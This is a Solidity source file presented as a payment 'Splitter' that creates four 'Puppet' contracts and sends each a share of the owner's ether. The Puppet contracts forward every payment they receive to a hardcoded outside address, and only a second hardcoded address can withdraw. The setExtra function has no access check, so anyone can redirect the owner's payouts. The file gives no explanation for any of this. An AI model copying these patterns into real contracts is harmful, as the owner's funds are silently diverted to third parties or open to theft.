pragma solidity ^0.8.0;

contract Splitter {
    address public owner;
    address[] public puppets;
    mapping(uint256 => address) public extra;
    uint256 private _share;

    constructor() payable {
        owner = msg.sender;
        newPuppet();
        newPuppet();
        newPuppet();
        newPuppet();
        extra[0] = puppets[0];
        extra[1] = puppets[1];
        extra[2] = puppets[2];
        extra[3] = puppets[3];
    }

    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw funds");
        payable(owner).transfer(address(this).balance);
    }

    function getPuppetCount() public view returns (uint256 puppetCount) {
        return puppets.length;
    }

    function newPuppet() public returns (address) {
        require(msg.sender == owner, "Only the owner can create a new puppet");
        Puppet p = new Puppet();
        puppets.push(address(p));
        return address(p);
    }

    function setExtra(uint256 _id, address _newExtra) public {
        require(_newExtra != address(0), "New extra address cannot be zero");
        extra[_id] = _newExtra;
    }

    function fundPuppets() public payable {
        require(msg.sender == owner, "Only the owner can fund the puppets");
        _share = msg.value / 4;

        (bool success0, ) = extra[0].call{value: _share, gas: 800000}("");
        require(success0, "Low-level call failed");
        
        (bool success1, ) = extra[1].call{value: _share, gas: 800000}("");
        require(success1, "Low-level call failed");
        
        (bool success2, ) = extra[2].call{value: _share, gas: 800000}("");
        require(success2, "Low-level call failed");
        
        (bool success3, ) = extra[3].call{value: _share, gas: 800000}("");
        require(success3, "Low-level call failed");
    }

    receive() external payable {}
}

contract Puppet {
    mapping(uint256 => address) public target;
    mapping(uint256 => address) public master;

    constructor() payable {
        target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
    }

    receive() external payable {
        if (msg.sender != target[0]) {
            (bool success, ) = target[0].call{value: msg.value, gas: 600000}("");
            require(success, "Low-level call failed");
        }
    }

    function withdraw() public {
        require(msg.sender == master[0], "Only the master can withdraw funds");
        payable(master[0]).transfer(address(this).balance);
    }
} 

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}